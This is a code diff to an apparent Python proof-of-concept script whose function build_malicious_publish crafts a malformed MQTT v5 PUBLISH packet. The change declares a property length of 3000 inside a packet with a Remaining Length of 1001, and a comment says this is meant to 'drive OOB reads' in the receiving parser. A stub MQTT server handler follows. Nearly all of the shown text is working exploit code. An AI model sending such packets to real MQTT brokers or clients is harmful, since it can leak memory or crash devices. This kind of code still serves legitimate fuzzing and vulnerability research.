@@ -99,23 +99,33 @@ def build_malicious_publish(topic: str = "sensor/data") -> bytes:
     # QoS 0 PUBLISH
     topic_bytes = topic.encode("utf-8")
     topic_len = len(topic_bytes)
-    prop_len_field = bytes([0xFF, 0xFF, 0xFF, 0x7F])
-    props = b""
+    property_len_value = 3000
+    prop_len_field = encode_varint(property_len_value)
+
+    # Keep Remaining Length smaller than property_len_value to drive OOB reads,
+    # while filling the actual packet with valid property IDs.
+    remaining_len = 1001
+    header_len = 2 + topic_len + len(prop_len_field)
+    data_len = remaining_len - header_len
+    if data_len <= 0 or data_len % 2 != 0:
+        raise ValueError("remaining_len must yield a positive even data length")
+
+    props_len = 200
+    if props_len > data_len or props_len % 2 != 0:
+        props_len = data_len
+    payload_len = data_len - props_len
+
+    props = build_property_stream_even(props_len)
+    payload = build_property_stream_even(payload_len)
+
     variable_header = (
         topic_len.to_bytes(2, "big")
         + topic_bytes
         + prop_len_field
         + props
+        + payload
     )
-    # Choose an odd Remaining Length so payload_len is even.
-    remaining_len = 4097
-    if len(variable_header) > remaining_len:
-        raise ValueError("variable header exceeds remaining length")
-    payload_len = remaining_len - len(variable_header)
-    if payload_len % 2 != 0:
-        raise ValueError("payload_len must be even for property stream")
-    payload = build_property_stream_even(payload_len)
-    return bytes([0x30]) + encode_varint(remaining_len) + variable_header + payload
+    return bytes([0x30]) + encode_varint(remaining_len) + variable_header
 
 
 class MQTTStubHandler(socketserver.BaseRequestHandler):
